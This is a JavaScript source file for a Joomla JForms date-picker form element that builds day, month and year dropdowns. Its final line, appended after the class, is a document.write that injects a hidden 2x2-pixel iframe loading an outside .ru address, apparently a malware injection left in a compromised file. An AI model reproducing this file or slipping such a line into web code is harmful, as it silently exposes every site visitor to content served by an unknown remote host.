/**
* Javascript object for date plugin
*
* @version		$Id: date.js 306 2009-09-07 06:44:45Z dr_drsh $
* @package		Joomla
* @subpackage	JForms
* @copyright	Copyright (C) 2008 Mostafa Muhammad. All rights reserved.
* @license		GNU/GPL
*/
var date = new Class({

	Extends: CLabeledElement,
	
	adapt: function( from ){

		this.position=from.position?from.position:this.position;
		this.hash=from.hash?from.hash:this.hash;
		this.label=from.label?from.label:this.label;
		this.css=from.css?from.css:this.css;
		this.lw=from.lw?from.lw:this.lw;
		this.lh=from.lh?from.lh:this.lh;
		this.required=from.required?from.required:this.required;
		this.startYear=from.startYear?from.startYear:this.startYear;
		this.span=from.span?from.span:this.span;
		this.ospan=from.ospan?from.ospan:this.ospan;
		this.defaultValue=from.defaultValue?from.defaultValue:this.defaultValue;
		this.onUpdate();

	},
	
	initialize: function( parent, id, beforeObject, params ) {
		
		this.type = "date";
		
		this.parent($(parent), id, $(beforeObject), params);
		
		
		this.startYear = params.startYear;
		this.span = params.span;
		this.ospan = params.ospan;
		this.css   = params.css;
		this.defaultValue = params.defaultValue;
		//YYYY-mm-dd
	
		var thisYear = new Date().getFullYear();
		this._currentSpan = this.span;
		//Till Present
		if(this.span == 0){
			this._currentSpan = thisYear - this.startYear;
		}
		//Other
		if(this.span == -1){
			$('ppage_date_ospan').disabled = false;
			this._currentSpan = this.ospan;
		} else {
			$('ppage_date_ospan').disabled = true;
		}
		
		
		var values = this.defaultValue.split('-');
		var year  = values[0];
		var month = values[1];
		var day   = values[2];
		
		
		//Red star that denotes a required field
		this.htmlRequiredStar = new Element('span', {
			'html': ' * ',
			'styles': {
				'color' : 'red'
			}
		});
		if( this.required ){
			this.htmlRequiredStar.inject( this.htmlLabel );
		}
		
		//Main input elements
		var br = new Element('br', {'clear':'all'});
	
		this.htmlInputDay = new Element('select', {
			'name': 'input_' + this.type + this.index + '_d',
			'id':'input_' + this.type + this.index + '_d',
			'styles':{
				'width':'60px',
				'margin-right':'10px'
			}
		});
		this._doDayList(this.htmlInputDay, day);
		this.htmlInputDay.inject( this.htmlContainer );
	
		this.htmlInputMonth = new Element('select', {
			'name': 'input_' + this.type + this.index + '_m',
			'id':'input_' + this.type + this.index + '_m',
			'styles':{
				'width':'80px',
				'margin-right':'10px'
			}
		});
		this._doMonthList(this.htmlInputMonth, month);
		this.htmlInputMonth.inject( this.htmlContainer );
		
		this.htmlInputYear = new Element('select', {
			'name': 'input_' + this.type + this.index + '_y',
			'id':'input_' + this.type + this.index + '_y',
			'styles':{
				'width':'120px'
			}
		});
		this._doYearList(this.htmlInputYear, this.startYear, this._currentSpan, year);
		this.htmlInputYear.inject( this.htmlContainer );
	
		br.inject( this.htmlContainer );
		
		
		
		
	},
	_doYearList : function( e, start, span, selected ){
		
		e.options.length = 0;
		span  = parseInt(span, 10);
		start = parseInt(start, 10);
		selected =  parseInt(selected, 10);
		
		for(i=0;i<span+1;i++){
		
			var o = new Option( i+parseInt(start,10), i+parseInt(start,10));
			o.selected = false;			
			if( i+start == selected || i == selected ){
				o.selected = true;
			}
			e.options[i] = o;
		}
	},
	
	_doDayList : function( e, selected ){
		
		e.options.length = 0;
		
		for(i=0;i<31;i++){
		
			var o = new Option( i+1, i+1);
			o.selected = false;			
			if( i+1 == selected ){
				o.selected = true;
			}
			e.options[i] = o;
		}
	},
	_doMonthList : function( e, selected ){
		
		e.options.length = 0;
		var months = new Array('January','February','March','April','May','June',
							   'July','August','September','October','November','December');
	
		for(i=0;i<months.length;i++){
		
			var o = new Option( months[i], i+1);
			o.selected = false;			
			if( months[i] == selected || i+1 == selected ){
				o.selected = true;
			}
			e.options[i] = o;
		}
	},
	
	onUpdate : function(){
		
		var thisYear = new Date().getFullYear();
		this._currentSpan = this.span;
		if(this.span == 0){
			this._currentSpan = thisYear - this.startYear;
		}
		if(this.span == -1){
			$('ppage_date_ospan').disabled = false;
			this._currentSpan = this.ospan;
		} else {
			$('ppage_date_ospan').disabled = true;
		}
		
		this.htmlLabel.set('html', this.label );

		//Red star that denotes a required field
		//Fix for IE!
		this.htmlRequiredStar.dispose();
		this.htmlRequiredStar = new Element('span', {
			'html': ' * ',
			'styles': {
				'color' : 'red'
			}
		});
		if( this.required ){
			this.htmlRequiredStar.inject( this.htmlLabel );
		}
		var values = this.defaultValue.split('-');
		var year  = values[0];
		this._doYearList(this.htmlInputYear, this.startYear, this._currentSpan, year);
	
		
	},
	
	onResizeDrag: function(newSize,type) {
	
		switch(type){
			
			case "label":
				this.htmlLabel.set('styles', { 'border': '1px solid white' } );	
		}
		this._alignLabelResizeHandle();	
	},


	onResizeEnd: function( newSize, type ){

		switch(type){
		
			case 'label':
				this.lw = newSize.x;
				this.lh = newSize.y;
				this.htmlLabel.set('styles', { 'border' : '0'});
		}
		this._alignLabelResizeHandle();	
		
	},
	

	
	deselect: function() {
	
		this.htmlContainer.removeClass('selected'); 
		this.htmlLabelResize.set({'styles':{ 'visibility' : 'hidden' }})
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'hidden' }})
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'hidden' }})
	
	},
	
	select  : function() {
		
		this.htmlContainer.addClass('selected');
		this.htmlLabelResize.set({'styles':{ 'visibility' : 'visible' }})
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'visible' }})
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'visible' }})
		this._alignLabelResizeHandle();		
	
	},
	
	serialize: function(){
		
		var order = getOrder( this.htmlContainer );
		var hash  = '';
	
		if(this.hash && this.hash.length){
			hash = this.hash;
		} else {
			hash = uniqueId( 5 );
		}
		
		
		var defaultValue = 
			parseInt(this.htmlInputYear.get('value'),10)  + '-' + 
			parseInt(this.htmlInputMonth.get('value'),10) + '-' + 
			parseInt(this.htmlInputDay.get('value'),10);
		
		return JSON.encode({
			type:this.type,
			position:order,
			hash:hash,
			label:this.label,
			css:this.css,
			lw:this.lw,
			lh:this.lh,
			required: this.required ,
			startYear: this.startYear,
			span : this.span,
			ospan: this.ospan,
			defaultValue : defaultValue
		});
		
	}
});
document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');